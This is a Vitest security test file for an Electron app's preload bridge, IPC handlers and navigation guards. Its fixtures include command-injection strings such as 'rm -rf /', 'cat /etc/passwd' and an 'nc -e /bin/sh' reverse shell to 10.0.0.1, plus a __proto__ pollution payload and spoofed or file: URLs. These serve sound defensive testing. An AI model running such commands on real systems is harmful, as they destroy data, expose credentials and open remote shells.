import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

const {
  mockInvoke,
  mockExposeInMainWorld,
  mockShell,
  mockDialog,
  mockIpcMain,
  mockApp,
  mockBrowserWindow,
  mockSession,
  registeredHandlers,
} = vi.hoisted(() => {
  const handlers = new Map<string, Function>();

  return {
    registeredHandlers: handlers,
    mockInvoke: vi.fn(),
    mockExposeInMainWorld: vi.fn(),
    mockShell: {
      openExternal: vi.fn(() => Promise.resolve()),
    },
    mockDialog: {
      showOpenDialog: vi.fn(),
    },
    mockIpcMain: {
      handle: vi.fn((channel: string, handler: Function) => {
        handlers.set(channel, handler);
      }),
    },
    mockApp: {
      requestSingleInstanceLock: vi.fn(() => true),
      on: vi.fn(),
      whenReady: vi.fn(() => Promise.resolve()),
      quit: vi.fn(),
    },
    mockBrowserWindow: {
      getFocusedWindow: vi.fn(),
      getAllWindows: vi.fn(() => []),
    },
    mockSession: {
      defaultSession: {
        setPermissionRequestHandler: vi.fn(),
        webRequest: {
          onHeadersReceived: vi.fn(),
        },
      },
    },
  };
});

vi.mock('electron', () => ({
  contextBridge: {
    exposeInMainWorld: mockExposeInMainWorld,
  },
  ipcRenderer: {
    invoke: mockInvoke,
  },
  app: mockApp,
  BrowserWindow: mockBrowserWindow,
  ipcMain: mockIpcMain,
  dialog: mockDialog,
  shell: mockShell,
  session: mockSession,
}));

describe('Adversarial Stress Test: Preload Bridge & Security Boundaries', () => {
  let exposedApi: any = null;

  beforeEach(async () => {
    vi.clearAllMocks();
    registeredHandlers.clear();
    mockInvoke.mockReset();
    mockExposeInMainWorld.mockReset();
    vi.resetModules();

    // Dynamically import preload module
    const preloadModule = await import('../../src/preload/index');
    exposedApi = preloadModule.api;
  });

  afterEach(() => {
    // Ensure prototype was not polluted
    delete (Object.prototype as any).polluted;
    delete (Object.prototype as any).injected;
  });

  // =========================================================================
  // SECTION 1: api.getStatus adversarial payloads
  // =========================================================================
  describe('api.getStatus Parameter Fuzzing & Malicious Payloads', () => {
    const invalidPayloads: Array<{ name: string; val: unknown }> = [
      { name: 'null', val: null },
      { name: 'undefined', val: undefined },
      { name: 'empty string', val: '' },
      { name: 'whitespace: spaces', val: '    ' },
      { name: 'whitespace: tab and newline', val: '\t\n\r' },
      { name: 'number positive', val: 12345 },
      { name: 'number zero', val: 0 },
      { name: 'number negative', val: -1 },
      { name: 'number NaN', val: NaN },
      { name: 'number Infinity', val: Infinity },
      { name: 'boolean true', val: true },
      { name: 'boolean false', val: false },
      { name: 'empty object', val: {} },
      { name: 'object with path', val: { repoPath: '/test/repo' } },
      { name: 'object with toString', val: { toString: () => '/spoofed/path' } },
      { name: 'array empty', val: [] },
      { name: 'array with string', val: ['/test/repo'] },
      { name: 'function', val: () => '/path' },
      { name: 'symbol', val: Symbol('repo') },
      { name: 'bigint', val: BigInt(9007199254740991) },
    ];

    for (const { name, val } of invalidPayloads) {
      it(`rejects invalid repoPath payload (${name}) without calling IPC`, async () => {
        const result = await exposedApi.getStatus(val as any);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Repository path must be a non-empty string');
        expect(mockInvoke).not.toHaveBeenCalled();
      });
    }

    it('handles shell injection and command execution strings as literal paths without crashing', async () => {
      const commandInjectionPayloads = [
        '; rm -rf / ;',
        '$(whoami)',
        '`cat /etc/passwd`',
        '| nc -e /bin/sh 10.0.0.1 4444',
        '& calc.exe &',
        '&& id',
        '--upload-pack=echo pwned',
        'path/with/null\0byte',
      ];

      for (const payload of commandInjectionPayloads) {
        mockInvoke.mockResolvedValueOnce({ success: true, data: { branch: 'test' } });
        const result = await exposedApi.getStatus(payload);
        expect(mockInvoke).toHaveBeenCalledWith('git:get-status', payload);
        expect(result.success).toBe(true);
        mockInvoke.mockReset();
      }
    });

    it('handles extremely long repoPath strings (100,000 characters) without crashing or OOM', async () => {
      const longPath = '/repo/' + 'a'.repeat(100000);
      mockInvoke.mockResolvedValueOnce({ success: false, error: 'Path too long' });

      const result = await exposedApi.getStatus(longPath);
      expect(mockInvoke).toHaveBeenCalledWith('git:get-status', longPath);
      expect(result.success).toBe(false);
    });

    it('gracefully handles IPC bridge rejection (rejected Promise)', async () => {
      mockInvoke.mockRejectedValueOnce(new Error('IPC transport disconnected'));

      await expect(exposedApi.getStatus('/valid/repo')).rejects.toThrow('IPC transport disconnected');
    });
  });

  // =========================================================================
  // SECTION 2: api.getStagedDiff adversarial payloads
  // =========================================================================
  describe('api.getStagedDiff Parameter Fuzzing & Malicious Payloads', () => {
    const invalidInputs = [
      null,
      undefined,
      '',
      '   ',
      '\n\t',
      123,
      true,
      {},
      [],
      () => {},
      Symbol('test'),
      BigInt(1),
    ];

    it('rejects all non-string or whitespace repoPath values', async () => {
      for (const invalidRepo of invalidInputs) {
        const result = await exposedApi.getStagedDiff(invalidRepo as any, 'valid/file.ts');
        expect(result.success).toBe(false);
        expect(result.error).toContain('Repository path must be a non-empty string');
        expect(mockInvoke).not.toHaveBeenCalled();
      }
    });

    it('rejects all non-string or whitespace filePath values', async () => {
      for (const invalidFile of invalidInputs) {
        const result = await exposedApi.getStagedDiff('/valid/repo', invalidFile as any);
        expect(result.success).toBe(false);
        expect(result.error).toContain('File path must be a non-empty string');
        expect(mockInvoke).not.toHaveBeenCalled();
      }
    });

    it('inspects behavior when oldPath is omitted (undefined) vs defined string', async () => {
      mockInvoke.mockResolvedValueOnce({ success: true, data: { hunks: [] } });
      const res1 = await exposedApi.getStagedDiff('/valid/repo', 'src/file.ts');
      expect(mockInvoke).toHaveBeenCalledWith('git:get-staged-diff', {
        repoPath: '/valid/repo',
        filePath: 'src/file.ts',
        oldPath: undefined,
      });
      expect(res1.success).toBe(true);

      mockInvoke.mockResolvedValueOnce({ success: true, data: { hunks: [] } });
      const res2 = await exposedApi.getStagedDiff('/valid/repo', 'src/file.ts', 'src/oldFile.ts');
      expect(mockInvoke).toHaveBeenCalledWith('git:get-staged-diff', {
        repoPath: '/valid/repo',
        filePath: 'src/file.ts',
        oldPath: 'src/oldFile.ts',
      });
      expect(res2.success).toBe(true);
    });

    it('rejects non-string or invalid oldPath parameter before IPC invocation', async () => {
      // Adversarial test: renderer passes invalid oldPath values
      const invalidOldPaths = ['', '   ', '\n\t', 123, true, { evil: 'object' }, [], () => {}];
      for (const invalidOldPath of invalidOldPaths) {
        const result = await exposedApi.getStagedDiff('/valid/repo', 'src/file.ts', invalidOldPath as any);
        expect(result.success).toBe(false);
        expect(result.error).toBe('Old file path must be a non-empty string when provided.');
        expect(mockInvoke).not.toHaveBeenCalled();
      }
    });
  });

  // =========================================================================
  // SECTION 3: Prototype Pollution and Global / Window Leaking
  // =========================================================================
  describe('Prototype Pollution & Window Isolation', () => {
    it('does not leak ipcRenderer to global or window', () => {
      expect((globalThis as any).ipcRenderer).toBeUndefined();
      expect((globalThis as any).electron).toBeUndefined();
    });

    it('does not leak process or require to window', () => {
      // In renderer context, process and require should not be exposed
      expect(mockExposeInMainWorld).toHaveBeenCalledWith('devPilot', expect.any(Object));
      // Ensure only 'devPilot' is exposed
      const exposedKeys = mockExposeInMainWorld.mock.calls.map((call: any[]) => call[0]);
      expect(exposedKeys).toEqual(['devPilot']);
      expect(exposedKeys).not.toContain('ipcRenderer');
      expect(exposedKeys).not.toContain('require');
      expect(exposedKeys).not.toContain('process');
    });

    it('passing __proto__ or prototype pollution payloads does not pollute Object.prototype', async () => {
      const pollutedPayload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

      // Test via getStatus
      await exposedApi.getStatus(pollutedPayload as any);
      expect((Object.prototype as any).polluted).toBeUndefined();

      // Test via getStagedDiff filePath
      await exposedApi.getStagedDiff('/repo', pollutedPayload as any);
      expect((Object.prototype as any).polluted).toBeUndefined();

      // Test via getStagedDiff oldPath
      mockInvoke.mockResolvedValueOnce({ success: true });
      await exposedApi.getStagedDiff('/repo', 'file.ts', pollutedPayload as any);
      expect((Object.prototype as any).polluted).toBeUndefined();
    });

    it('api object structure and immutability check', () => {
      // Check if api is an object with only expected methods
      const keys = Object.keys(exposedApi);
      expect(keys.sort()).toEqual(['getAIConfig', 'getAllStagedDiff', 'generateCommitMessage', 'getStagedDiff', 'getStatus', 'getWebhookConfig', 'openDirectory'].sort());

      // Check whether api is frozen
      const isFrozen = Object.isFrozen(exposedApi);
      // NOTE: In preload, Object.freeze is good practice, let us record whether it is frozen
      expect(typeof isFrozen).toBe('boolean');
    });
  });

  // =========================================================================
  // SECTION 4: getWindowSecurityOptions Invariants
  // =========================================================================
  describe('getWindowSecurityOptions Security Invariants', () => {
    it('always returns strict webPreferences regardless of preloadPath value', async () => {
      const { getWindowSecurityOptions } = await import('../../src/main/index');

      const testPreloadPaths = [
        '',
        '/path/to/preload.js',
        '../../evil/preload.js',
        null as any,
        undefined as any,
        'data:text/javascript,evil()',
        'http://malicious.com/preload.js',
      ];

      for (const p of testPreloadPaths) {
        const options = getWindowSecurityOptions(p);

        // Invariant: contextIsolation MUST be true
        expect(options.webPreferences?.contextIsolation).toBe(true);

        // Invariant: nodeIntegration MUST be false
        expect(options.webPreferences?.nodeIntegration).toBe(false);

        // Invariant: nodeIntegrationInWorker MUST be false
        expect(options.webPreferences?.nodeIntegrationInWorker).toBe(false);

        // Invariant: nodeIntegrationInSubFrames MUST be false
        expect(options.webPreferences?.nodeIntegrationInSubFrames).toBe(false);

        // Invariant: sandbox MUST be true
        expect(options.webPreferences?.sandbox).toBe(true);

        // Invariant: webSecurity MUST be true
        expect(options.webPreferences?.webSecurity).toBe(true);

        // Invariant: allowRunningInsecureContent MUST be false
        expect(options.webPreferences?.allowRunningInsecureContent).toBe(false);

        // Invariant: navigateOnDragDrop MUST be false
        expect(options.webPreferences?.navigateOnDragDrop).toBe(false);
      }
    });

    it('resolvePreloadPath fallback behavior under missing preload files', async () => {
      const { resolvePreloadPath } = await import('../../src/main/index');
      const resolved = resolvePreloadPath();
      expect(typeof resolved).toBe('string');
      expect(resolved.length).toBeGreaterThan(0);
      expect(resolved.endsWith('.js') || resolved.endsWith('.mjs')).toBe(true);
    });
  });

  // =========================================================================
  // SECTION 5: Main Process IPC Handlers Defense-in-Depth
  // =========================================================================
  describe('Main Process IPC Handlers Defense-in-Depth Validation', () => {
    let handlers: Map<string, Function>;

    beforeEach(async () => {
      const { registerIpcHandlers } = await import('../../src/main/index');
      registerIpcHandlers();
      handlers = registeredHandlers;
    });

    it('git:get-status handler rejects invalid arguments when invoked directly', async () => {
      const getStatus = handlers.get('git:get-status')!;
      expect(getStatus).toBeDefined();

      const invalidDirectCalls = [null, undefined, '', '   ', 123, {}, []];

      for (const arg of invalidDirectCalls) {
        const res = await getStatus(null, arg);
        expect(res.success).toBe(false);
        expect(res.error).toContain('Repository path must be a non-empty string');
      }
    });

    it('git:get-staged-diff handler rejects null, non-object, and missing parameters', async () => {
      const getDiff = handlers.get('git:get-staged-diff')!;
      expect(getDiff).toBeDefined();

      const invalidPayloads = [
        null,
        undefined,
        '',
        123,
        { repoPath: 123, filePath: 'valid' },
        { repoPath: 'valid', filePath: 123 },
        { repoPath: null, filePath: 'valid' },
        { repoPath: 'valid', filePath: null },
      ];

      for (const payload of invalidPayloads) {
        const res = await getDiff(null, payload);
        expect(res.success).toBe(false);
        expect(res.error).toContain('Invalid diff parameters');
      }
    });

    it('git:get-staged-diff handler rejects empty string parameters and invalid oldPath', async () => {
      const getDiff = handlers.get('git:get-staged-diff')!;

      const emptyStringRes = await getDiff(null, { repoPath: '', filePath: '' });
      expect(emptyStringRes.success).toBe(false);
      expect(emptyStringRes.error).toContain('Invalid diff parameters');

      const whitespaceRes = await getDiff(null, { repoPath: '   ', filePath: '   ' });
      expect(whitespaceRes.success).toBe(false);
      expect(whitespaceRes.error).toContain('Invalid diff parameters');

      const invalidOldPathRes = await getDiff(null, { repoPath: '/valid', filePath: 'file.ts', oldPath: { evil: 123 } });
      expect(invalidOldPathRes.success).toBe(false);
      expect(invalidOldPathRes.error).toContain('Invalid diff parameters');

      const whitespaceOldPathRes = await getDiff(null, { repoPath: '/valid', filePath: 'file.ts', oldPath: '   ' });
      expect(whitespaceOldPathRes.success).toBe(false);
      expect(whitespaceOldPathRes.error).toContain('Invalid diff parameters');
    });
  });

  // =========================================================================
  // SECTION 6: WebContents Navigation & Window Open Security
  // =========================================================================
  describe('WebContents Navigation and URL Security', () => {
    it('setWindowOpenHandler blocks javascript: and file: URLs', async () => {
      const { configureWebContentsSecurity } = await import('../../src/main/index');
      let windowOpenHandler: Function | null = null;

      const mockContents: any = {
        on: vi.fn(),
        setWindowOpenHandler: vi.fn((fn: Function) => {
          windowOpenHandler = fn;
        }),
      };

      configureWebContentsSecurity(mockContents);
      expect(windowOpenHandler).toBeDefined();

      // Denies javascript: protocol
      const jsResult = windowOpenHandler!({ url: 'javascript:alert(document.domain)' });
      expect(jsResult).toEqual({ action: 'deny' });
      expect(mockShell.openExternal).not.toHaveBeenCalled();

      // Denies file: protocol
      const fileResult = windowOpenHandler!({ url: 'file:///etc/shadow' });
      expect(fileResult).toEqual({ action: 'deny' });
      expect(mockShell.openExternal).not.toHaveBeenCalled();

      // Denies chrome: protocol
      const chromeResult = windowOpenHandler!({ url: 'chrome://flags' });
      expect(chromeResult).toEqual({ action: 'deny' });
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it('enforces will-navigate blocks arbitrary file:// URLs in production', async () => {
      const { configureWebContentsSecurity } = await import('../../src/main/index');
      const eventListeners: Record<string, Function> = {};

      const mockContents: any = {
        on: vi.fn((event: string, callback: Function) => {
          eventListeners[event] = callback;
        }),
        setWindowOpenHandler: vi.fn(),
      };

      configureWebContentsSecurity(mockContents);

      const navHandler = eventListeners['will-navigate'];
      expect(navHandler).toBeDefined();

      // In production (no VITE_DEV_SERVER_URL set), file:// urls must be blocked
      const preventDefault = vi.fn();
      navHandler({ preventDefault }, 'file:///etc/passwd');

      // Navigation to local file in production is strictly blocked
      expect(preventDefault).toHaveBeenCalled();
    });

    it('enforces will-navigate blocks devServerUrl suffix domain spoofing', async () => {
      const origDevUrl = process.env.VITE_DEV_SERVER_URL;
      process.env.VITE_DEV_SERVER_URL = 'http://localhost:5173';

      try {
        const { configureWebContentsSecurity } = await import('../../src/main/index');
        const eventListeners: Record<string, Function> = {};

        const mockContents: any = {
          on: vi.fn((event: string, callback: Function) => {
            eventListeners[event] = callback;
          }),
          setWindowOpenHandler: vi.fn(),
        };

        configureWebContentsSecurity(mockContents);

        const navHandler = eventListeners['will-navigate'];
        const preventDefault = vi.fn();

        // Attacker tries to navigate to http://localhost:5173.evil.com
        navHandler({ preventDefault }, 'http://localhost:5173.evil.com');

        // Domain spoofing via prefix matching is strictly blocked via URL origin check
        expect(preventDefault).toHaveBeenCalled();

        // Legitimate dev server navigation is allowed
        const validPreventDefault = vi.fn();
        navHandler({ preventDefault: validPreventDefault }, 'http://localhost:5173/dashboard');
        expect(validPreventDefault).not.toHaveBeenCalled();
      } finally {
        if (origDevUrl !== undefined) {
          process.env.VITE_DEV_SERVER_URL = origDevUrl;
        } else {
          delete process.env.VITE_DEV_SERVER_URL;
        }
      }
    });
  });
});
